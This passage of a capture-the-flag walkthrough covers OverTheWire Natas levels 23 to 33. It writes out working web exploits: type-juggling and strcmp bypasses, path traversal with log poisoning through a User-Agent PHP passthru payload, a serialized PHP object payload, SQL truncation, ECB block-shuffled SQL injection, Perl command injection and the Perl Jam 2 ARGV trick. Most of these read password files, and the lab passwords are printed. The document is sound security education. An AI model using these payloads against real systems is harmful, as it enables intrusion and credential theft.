`strstr()` checks if the second input is a substring of the first, so the password should contain the substing `iloveyou`. The second condition `$_REQUEST["passwd"] > 10` is the more complicated one. `PHP` will try to cast the password to a numeric value, and check if that value is greater than 10. The numeric value of `iloveyou` is 0, but by adding any value greater than 10 before that, `PHP` will cast it to that value. So, if we submit the password `11iloveyou` for example, we get the password.


Password: `MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd`

## Level 24 → 25
We have another password input, and again we can see a condition that if satisfied reveals the password:
```php
if(!strcmp($_REQUEST["passwd"],"<censored>")){
```
The password input is being compared to a string, that we don't know, using `strcmp()`. `strcmp()` returns 0 if the strings are equal, otherwise 1 or -1. Because of the `!`, we need `strcmp()` to return a value that by adding `!`, will give a non-zero value. The thing is, if we use `strcmp()` to compare a string with another type of variable, like an array, it will have an error and return `NULL`, and `!NULL` equals 1. So, we manipulate the `GET` paramter to be an array by using `?passwd[]=array` in the URL, and we get the error message from `strcmp()` and also the next password.

Password: `ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws`

## Level 25 → 26
This page presents a quote and an input to change it's language. At the source code, we find this line:
```php
if(safeinclude("language/" . $_REQUEST["lang"] ))
```
So the code uses `safeinclude()` in order to read the file for each language. This is an opportunity for path traversal, but there are 2 validations inside `safeinclude()` that makes it harder.
```php
// check for directory traversal
if(strstr($filename,"../")){
    logRequest("Directory traversal attempt! fixing request.");
    $filename=str_replace("../","",$filename);
...
// dont let ppl steal our passwords
if(strstr($filename,"natas_webpass")){
    logRequest("Illegal file access detected! Aborting!");
    exit(-1);
```
The strings `'../'` and `'natas_webpass'` are not allowed in the input. The first validation can be overpassed by using `'....//'` instead of `'../'`. `str_replace` will replace `'../'` inside `'....//'`, so the output will be `'../'` as we want. The second validation cannot be overpassed, as long as I can tell, I tried and failed. In that case we can use path traversal attack, but the only file we cannot access is the password file.

Another function inside the code is `logRequest()`, it writes the logs from the validations inside a file.
```php
function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
```
Now that we know how to path traverse, we can view the logs file. We can see the location and name of the file in the function, but we don't know how many directories the code file is far from the main directory, so we have to try different amount of `'....//'` inside the input. When using this input:
```
....//....//....//....//....//var/www/natas/natas25/logs/natas25_i1c6n19kmkfemsk90ss0djsqk5.log
```
Where `i1c6n19kmkfemsk90ss0djsqk5` is out session ID, we read the logs file. It still doesn't help us yet, but if we look closely we can see `$_SERVER['HTTP_USER_AGENT']` being written inside that file. We can control the `User-Agent` variable inside our requests, so that is another input we can manipulate.
```php
User-Agent: <?php echo passthru("cat /etc/natas_webpass/natas26"); ?>
```
By setting the `User-Agent` in our request as this command, we are `command injecting`, practically tricking the server to execute the `cat` command on the password file and include it inside the log it writes. Because we use `'....//'` to see the logs file, the server writes a new log to that file while using the command we injected as `User-Agent`, and we can see the password.

Password: `cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE`

## Level 26 → 27
In this level, we have inputs for 2 points (x, y) and the website draws a line between them. Inside the source code, we can see some interesting things. First, there is a class called `Logger` that writes logs into a file. It uses functions like `__constract()` and `__destruct()`. We can also see this code:
```php

if (array_key_exists("drawing", $_COOKIE)){
    $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
}
```
This is a vulnerability we can use.

### PHP Serialization
`Serialization` is a way to turn complex data (like arrays or objects) into a string, so it can be stored in files, sessions, or cookies — and later be reconstructed using `unserialize()`. To explain the format, we can look at the following example.
```
profile=O:4:"User":1:{s:4:"name";s:5:"admin";}
```
`0` means it's an object, and `4` means the object's name has 4 characters. `"User"` is the name of the object, and `1` means it has one property. Inside `{...}` is the object's property map. `s:4:"name"` - `s` means the property is a `string`, it's name has `4` characters and it's name is `"name"`. `s:5:"admin"` - the value is a `string` of `5` characters - `"admin"`.

### PHP Deserializiation Attack
A `PHP deserialization attack` happens when an application takes user-controlled input and passes it into `PHP`’s `unserialize()` function. This can be dangerous, because serialized data can contain PHP objects, and when they're deserialized, their `magic methods` (like `__wakeup()`, `__destruct()`, or `__toString()`) can be triggered — potentially running malicious code or causing logic flaws. If the application has classes that do interesting things in those `magic methods` (like writing to files, deleting files, executing commands), an attacker can craft a fake serialized object and trigger those behaviors without permission. We should never use `unserialize()` on user inputs, it is safer to use `json_encode()` and `json_decode()` instead.

From the code and explanations above, to use this vulnerability we have to construct a malicious object that overrrides the `Logger` class `__contruct()` method, serialize (and also `base64_encode`) it, and pass it in the `drawing` attribute inside our cookie. Then a log file will be created and we will be able to access the password through it. In order to do so, we make the following file:
```php
<?php
class Logger{
	private $logFile;
	private $exitMsg;

	function __construct(){
		$this->logFile = "./img/filename.php";
		$this->exitMsg = "<?php echo passthru('cat /etc/natas_webpass/natas27') ?>";
	}
}

$logger = new Logger();
echo base64_encode(serialize($logger))
?>
```
We make a new `Logger` instance of our own, overriding the server's `$logFile` to a file we can access, and `$exitMsg` similarly to the previous level with a `command injection` to print the password file. This is the output:
```
Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxODoiLi9pbWcvZmlsZW5hbWUucGhwIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTY6Ijw/cGhwIGVjaG8gcGFzc3RocnUoJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpID8+Ijt9
```
Using `Burp`, we set the cookie `drawing` property to the output we got and send a request. When it is received by the server, it `base64_decode`s and `deserialize`s it, and sets `$drawing` as the object we created. At the end of the run, `__destruct()` is called with the malicious `$logFile` and `$exitMsg` we injected, and write it into the file. Then, we visit the path `/img/filename.php` and we can see the password.

Password: `u3RRffXjysjgwFU6b9xa23i6prmUsYne`

## Level 27 → 28
We have inputs for username and password. Looking at the source code we notice that this time `$query` uses `'...'` to insert users' input inside it, and all inputs are being checked by a function called `mysqli_real_escape_string()`. This is a built in function that escapes special characters in a string automatically, for example it replaces `'` with `\'`. So we can't use `SQL injection` this time, we have to find another way.

When the form is submitted, the server will make several validations. The first validation is in `validUser()`, which checks if the username already exists in the database. If the username exists, it uses `checkCredentials()` to check if the password is correct, and if it is, the password is given using `dumpData()`. If such username doesn't exist, the server creates a new user with `createUser()`. The latest 3 functions are the key to our attack.

First, we can see these lines inside the code:
```sql
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
```
This is a hint, now we know that although no input validation checks it, the maximum length of `username` and `password` is 64 chars. In many `SQL`s, when a value is given and it's length exceeds the maximal length, it is being truncated, unless `strict mode` is enabled. We don't see if it is enabled, so it's worth trying. We first send a request with these body parameters:
```http
username=natas28+++++++++++++++++++++++++++++++++++++++++++++++++++++++++a&password=pass
```
This string is `'natas28'`, then 57 `'+'`s and we end with an `'a'`. When this input is received by the server, it first being checked by `validUser()`. There is no such user, so `createUser()` is called with these username and password. This function checks if the username is not the same after trimming, but it is because the spaces are only on the "inside", it starts and ends with valid chars. So we pass that validation and the user is created, which means the username and password are inserted into the database. At this point, the username inserted is being truncated, but only the last `'a'` is removed, so the username inserted is `'natas28' + 57 spaces`. Then we use another request with this input:
```http
username=natas28+++++++++++++++++++++++++++++++++++++++++++++++++++++++++&password=pass
```
We just removed the last `'a'`. This time the server uses `validUser()` to check if this username exists and it does. So `checkCredentials()` is called and finds out the user `'natas28' + 57 spaces` exists in the database, and the passwords match. So it uses `dumpData()` to print the user's credentials, and if we look at the first line in this function:
```php
$user=mysqli_real_escape_string($link, trim($usr));
```
The input username is trimmed before injected into the query. So `'natas28' + 57 spaces` is trimmed to be `'natas28'`. So the username and password returned by the query are of `'natas28'`, and we get the password.

Password: `1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj`

## Level 28 → 29
This time we find a search input that gives us computer related jokes (some of them are nice) and we do not get the source code. The search results are not displayed on the same page, we are being redirected to another page, and we can notice that the `URL query` on this page is very long and looks random. By removing one of the chars in the query, we get this error:
```
Notice: Trying to access array offset on value of type bool in /var/www/natas/natas28/search.php on line 59
Zero padding found instead of PKCS#7 padding
```
So the `URL query` has something to do with `PKCS#7 padding`. 

### Block Cipher
A `block cipher` is a method used to encrypt information. It works by taking a fixed-size group of data (`block`), usually 16 bytes, and encrypting it using a `secret key`. For example, if you have a message like "HELLO WORLD", the cipher breaks it into blocks, then encrypts each block separately. The same `secret key` is used for both encrypting and decrypting. If the message isn’t long enough to fill a block, extra `padding` is added. There are different ways to encrypt multiple blocks (called "modes"), such as `ECB` (which encrypts each block separately) or `CBC` (which links the blocks together). Block ciphers are a core part of keeping data safe in things like online banking and secure messaging.

`PKCS#7` is an algorithm for padding `block ciphers`. Since the data has to be an exact multiple of the block size, `PKCS#7` adds padding to the last block. If the data is already a full block, a whole new block of padding is added. The actual padding is a sequence of bytes, each with the value equal to the number of padding bytes. For example, if the block size is 8 bytes and the plain text is `'hello'`, then the padded block will be `'hello\x03\x03\x03'`.

To understand the encryption, we try some different inputs, starting with inputs of only one char. We can see that the format is the same for all of them:
```
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjP + <random 22 bytes> + vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D 
```
Next, we try different lengths of inputs to identify the encryption block size. Using `Burp`, we send `'AA...A'` as an input in different lengths. When the length is less or equal to 12, the ciphertext is 108 bytes long, but for length 13 and 14 the cipher is 128 bytes long. We can see that another block was added. But why is it happening by incresing 12 to 13 bytes and not for standard 8 or 16 bytes? Knowing about `base64_encoding`, we can assume that the plaintext is being encoded in `base64` and then padded. This is reasonable because we know that `base64 encoding` increases the size by `~33.333%`, so the block size is 16 bytes. But in the output cipher it does not split to 16 bytes, and we can see that the random block for different 1-char inputs is 22 bytes long. We can assume again that the reason is `base64 encoding`, after encrypting each block, the output is `base64 encoded` again, so the length increases again by `~33.333%`.

When trying the `'AA...A'` inputs, we can notice something weird:
```
...
Len 07: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP KvwmKMYUAmbbaAruK1epuI ZIaVSupG+5Ppq4WEW09L0Nf/K3JUU/wpRwHlH118D44=
Len 08: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP LNQ6RxZsY7UPRe5yiycfUi iW3pCIT4YQixZ/i0rqXXY5FyMgUUg+aORY/QZhZ7MKM=
Len 09: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP KIFsYeK8Y3JmD4ecRfI3d+ oJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5+MA=
Len 10: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP JfIqcn9iVBmkZvmvU4kfmy c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
Len 11: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP JfIqcn9iVBmkZvmvU4kfmy NjNpR93/Bz0TLCI5HmVRCMqM9OYQkTq645oGdhkgSlo=
Len 12: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP JfIqcn9iVBmkZvmvU4kfmy h1J9Q3czmMbvHxFKUToAKHX9UET9Bj0m9rt/c0tByJk=
```
As we can see, for inputs of length 1-9, the 3rd block is different each time. But for inputs of length 10-12, the 3rd block stays the same. We can assume that the first 10 chars of the input are included in the 3rd block, and the 11 and 12 chars are part of the ending blocks.

Another thing we can try are special characters like `'`, `"`, and `\` inside the input. When we use an input of 11 'A' and then a special character, a new block is created. But the length is 12 bytes as before, then why is that happening? We can assume that the reason is escaping, the server adds `\` before those to avoid `SQL injections`. To justify that, we will try 9 'A' and then a special character that should be escaped, for example `'` and `"`. This is the result:
```
': G+glEae6W/1XjA7vRm21n NyEco/c+J2TdR0Qp8dcjP IWJ2pwLjKxd0ddiQ3a1c5l stdkbwCSkbjZzJR1Froznc qM9OYQkTq645oGdhkgSlo=
": G+glEae6W/1XjA7vRm21n NyEco/c+J2TdR0Qp8dcjP IWJ2pwLjKxd0ddiQ3a1c5l e0uzFQTQyTJF5uPUK3I8gM qM9OYQkTq645oGdhkgSlo=
```
We can see that only the 4th block is different, so we assume that a `\` is added before the special characters to escape them, making the first 10 chars of the input `'AA..A\'` for both of them and therefore the 3rd block is the same. This is important because this way we can "push" special characters into the next block.

Therefore, we can assume that the server is doing the following process:
```
plaintext → escape → base64 encode → PKCS#7 pad → encrypt → base64 encode → URL encode
```
Now that we know the process, we can try to mimic that with an input we craft, so we can avoid the escaping of special characters and try to do `SQL injection`. First, we want to try a simple `' OR 1=1 -- ` injection. To do so, we can use the server's escaping to "push" the `'` to the second block. So we use an input that looks like this:
```
<9 time 'A'> + "' OR 1=1 -- "
```
The space after `--` is important, so the block is exactly 12 bytes. The output looks like this:
```
<2 start blocks> + <block for 9 'A' + '\'> + <block for "' OR 1=1 -- "> + <2 ending blocks>
G+glEae6W/1XjA7vRm21n NyEco/c+J2TdR0Qp8dcjP IWJ2pwLjKxd0ddiQ3a1c5l WY4bHaEWFEfgtXy4iixC3k HAmMS6zcXtk1dWTlEF3X5 k0NzIaCU2kq38vTeW0b+K
```

Now, we replace the input from last time to be `<11 spaces> + OR 1=1 -- `. We can extract the 3rd block from the output (as we know it's length is 22 bytes and we know the first 2 blocks), and we get `ItlMM3qTizkRB5P2zYxJsb`, which is a block full of spaces. Now, we replace the 3rd block from earlier with this block, and we get this:
```
<2 start blocks> + <block for 10 spaces> + <block for "' OR 1=1 -- "> + <2 ending blocks>
G+glEae6W/1XjA7vRm21n NyEco/c+J2TdR0Qp8dcjP ItlMM3qTizkRB5P2zYxJsb WY4bHaEWFEfgtXy4iixC3k HAmMS6zcXtk1dWTlEF3X5 k0NzIaCU2kq38vTeW0b+K
```
We use this input as the query in the `GET` request and we get all the jokes, which means our injection worked. Now, we want to use this way to inject a malicious input that will give us the password. Let's check what tables exist in that DB, we can do that by injecting this input `' UNION SELECT table_name FROM information_schema.tables -- `. Again, we add 9 A's at the beggining, and then replacing the 3rd block with the spaces block `ItlMM3qTizkRB5P2zYxJsb`. So we use this query:
```
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjP ItlMM3qTizkRB5P2zYxJsb r0T1ii%2BYsw9O0BMRL2Q9HUY%2BHp7DfIbgLrY9HzzScnSwiwIQQLHbuTybkf0vfvyOoCLbaaTsQXr%2FFtPddaH%2FkEHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b%2BK
```
And we get all the table names as a result. We can see `jokes` in there but the one we're intersted in is `users`. The input we want to inject now is `' UNION SELECT password FROM users; -- ` to hopefully get the password. As before, we use 9 A's and the input, then replace the 3rd block with the spaces block, so be using this query
```
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbWnPci%2FqKte0ohRTkObF%2BT5ujPcGtKfnu%2FmSL%2FsyLoz1y%2BexMySI3M79Oa4mUCUQ%2Fp36O0aq%2BC10FxP%2FmrBQjq0eOsaH%2BJhosbBUGEQmz%2Fto%3D
```
We get the next password.

Password: `31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns`

## Level 29 → 30
In this page, we have a dropdown menu that loads and shows `Perl` files. Common attack on `Perl` is a command injection, and it is done by adding `|` or `;` before the injected command as an input, in order to run other commands with the command executed. An important note is, for the injection to actually work, it must end with null (`%00`).

The file name is passed as a parameter `file` in the `GET` request, so by changing the parameter to `|whoami%00` we get the output `natas29`. So the injection works, and the server is located in this directory. Now, we can easily print the password in the same way, by injecting `|cat /etc/natas_webpass/natas30%00`. But after trying, it doesn't work. we get a `meeeeeep!` as an output, which means the server knows we tried to print the password and avoided it.

Looking at the URL, we can see that the `homepage` (`/`) navigates us to the `index.pl` file. So, in order to understand what defence uses the server to avoid the injection, we can use the injection again to see that file by using `|cat index.pl%00`. It works, and we can see this `if` in the source code:
```
if($f=~/natas/){
    print "meeeeeep!<br>";
}
```
The server uses `regex` and if the input has the word `natas` in it, it prints the `meeeeeep!` message instead of the file requested. So, we need a way to avoid using the word `natas`, but still need to print the password file.

In `Perl`, we can use `?` as a `wild card` in order to search a file. In this case, we can use `?atas` instead of `natas` and it will automatically use this command on all files that ends with `atas`, including the `natas` file. So by using this command: `|cat /etc/?atas_webpass/?atas30%00`, the file is printed and we get the next password.

Password: `WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH`

## Level 30 → 31
This time we find the good old username and password fields, so we should probably use `SQL injection`. We also get the source code, and it has been written in `Perl`. The key in this code is the following line:
```
my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 
```
As [this answer](https://security.stackexchange.com/questions/175703/is-this-perl-database-connection-vulnerable-to-sql-injection/175872#175872) explains, `quote()` can be exposed by sending multiple values of the same parameter. As shown [here](https://www.oreilly.com/library/view/programming-the-perl/1565926994/re43.html), it will treat it as 2 arguments for the function, and will use the second value as the type of the first one. If the type is not a string, `quote()` will not add any quotes to the value and therefore we will be able to perform an injection. By sending these params:
```
username=name&password='pass'%20or%201%3d1&password=2
```
We make the server use `name` as the username and `pass or 1=1` as the password, while treating it as a non-string type (as shown [here](https://www.nntp.perl.org/group/perl.dbi.dev/2001/11/msg485.html?ref=learnhacking.io), we could also use other data types). So no quotes are added, our `SQL injection` works and we get the next password.

Password: `m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y`

## Level 31 → 32
Once we log in, we have the source code and an option to upload a file. It's supposed to be a `CSV` file, but any file will work, and once uploaded, it is being printed nicely on the screen. I thought there's an easy vulnerability right here, but I tried uploading many files with different types and tricks but nothing worked. 

As seen in [this video](https://www.youtube.com/watch?v=RPvORV2Amic) ([PDF](https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf)) about a known exploitation in Perl, `The Perl Jam 2`, the key in this level is the `Perl` language itself, not how it has been used. Starting at about 13:45 minutes, Netanel explains how different modules handle input data, in our case the used module is `CGI`, as we can see in the source code. Then, at about 18:35 minutes, we can see an "extreme example", which is very familiar to the code in this level. In fact, it is the same up until the `while` loop.

```
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
...
```
Let's explain step by step. The first row creates a new `CGI` instance, which is a protocol that lets us execute perl commands from web requests.
```
if ($cgi->upload('file')) {
```
`upload()` is supposed to check if the `file` parameter is an uploaded file. In reality, `upload()` checks if ONE of `file` values is an uploaded file. Therefore, uploading a file AND assigning a scalar to the same parameter will work.
```
my $file = $cgi->param('file');
```
`param()` returns a list of all the parameter values, but only the first value is inserted into `$file`. If the scalar value was assigned first, `$file` will be assigned the scalar value instead of the uploaded `file descriptor`, which means `$file` is now a regular string.
```
while (<$file>) {
```
`<>` doesn’t work with strings, unless the string is `"ARGV"`. In that case, `<>` loops through the ARG values, inserting each one to an `open()` call. Instead of displaying our uploaded file content, `<>` will now display the content of ANY file we’d like, and that file is the password file.

So, using `Burp` we capture the `POST` request of submitting a random `CSV` file. Then, by using what we learned from the source above, we craft this request:
```
POST /index.pl?%2fetc%2fnatas_webpass%2fnatas32 HTTP/1.1
...

------geckoformboundary1a049a7a33f067ae1047023a86016037
Content-Disposition: form-data; name="file"

ARGV
------geckoformboundary1a049a7a33f067ae1047023a86016037
Content-Disposition: form-data; name="file"; filename="username.csv"
Content-Type: text/csv

Username; Identifier;First name;Last name
booker12;9012;Rachel;Jones;</script>

------geckoformboundary1a049a7a33f067ae1047023a86016037
Content-Disposition: form-data; name="submit"

Upload
------geckoformboundary1a049a7a33f067ae1047023a86016037--
```
We made 2 changes to the original request. First, we added `?/etc/natas_webpass/natas32` to the URL. This is the string `file descriptor` we talked about, being inserted into `open()`. Second, we added this part:
```
------geckoformboundary1a049a7a33f067ae1047023a86016037
Content-Disposition: form-data; name="file"

ARGV
```
This is the first file uploaded, and as discussed earlier, it only contains `"ARGV"`. We send this request, and just like that we've managed to trick Perl into showing us the password using `The Perl Jam 2` vulnerability.

It's worth mentioning that according to the source, adding `|` at the end of the URL will make Perl execute a command instead of just reading that as a file descriptor. Therefore, another way is adding `?cat%20/etc/natas_webpass/natas32%20|` to the URL, while making the same `ARGV` change as before.

Password: `NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B`

## Level 32 → 33
We have this file uploading form again, but this time it says "There is a binary in the webroot that you need to execute.". As we did in the last level, we already know how to execute a command using `The Perl Jam 2` vulnerability. So, we do the same as last level, capturing a request and adding an `"ARGV"` file.

In order to see the files in the webroot directory, we add `?ls%20.%20|` to the URL. We can see the files in the webroot, one of them is called `getpassword`. So we change the URL and this time we add `?./getpassword%20|`. The file is executed and we get the next password.

Password: `2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ`